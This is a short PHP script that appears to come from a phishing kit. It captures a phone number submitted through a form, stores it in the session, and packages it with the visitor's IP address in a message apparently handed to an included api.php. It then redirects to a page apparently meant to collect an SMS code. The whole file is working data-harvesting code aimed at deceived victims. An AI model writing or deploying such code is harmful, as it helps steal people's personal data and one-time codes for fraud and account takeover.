<?php

session_start();



$sms = $_SESSION['PhoneNumber'] = $_POST['PhoneNumber'];


$hexor = '
# Phone Number 📱
# Number : '.$_SESSION["PhoneNumber"].' 
# IP : '.$_SERVER['REMOTE_ADDR'].' 
';







include("api.php"); 



header('Location: ./sms_espira.php');


?>


